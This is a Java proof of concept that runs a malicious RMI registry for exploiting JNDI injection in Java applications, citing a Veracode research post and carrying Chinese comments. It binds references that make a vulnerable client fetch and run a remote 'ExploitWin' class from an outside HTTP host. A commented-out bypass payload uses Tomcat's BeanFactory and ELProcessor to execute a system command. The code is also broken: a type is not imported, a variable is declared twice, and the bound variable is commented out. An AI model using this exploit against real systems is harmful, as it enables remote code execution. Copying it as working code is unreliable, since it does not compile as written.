//Ref: https://www.veracode.com/blog/research/exploiting-jndi-injections-java
  
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.StringRefAddr;
import org.apache.naming.ResourceRef;

public class NormalRMIServer {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1097);
        // 绕过方式的payload
//        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
//        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
//        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));


        // 普通方式的payload
        Reference ref = new Reference("whatever", "ExploitWin","http://192.168.85.1:8888/");
        
        // 普通方式的payload之二
        ResourceRef ref = new ResourceRef("whatever", null, "", "", true,"ExploitWin","http://192.168.85.1:8888/");
        
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
        registry.bind("EvalObj", referenceWrapper);
        System.out.println("the Server is bind rmi://127.0.0.1:1097/EvalObj");
    }
}
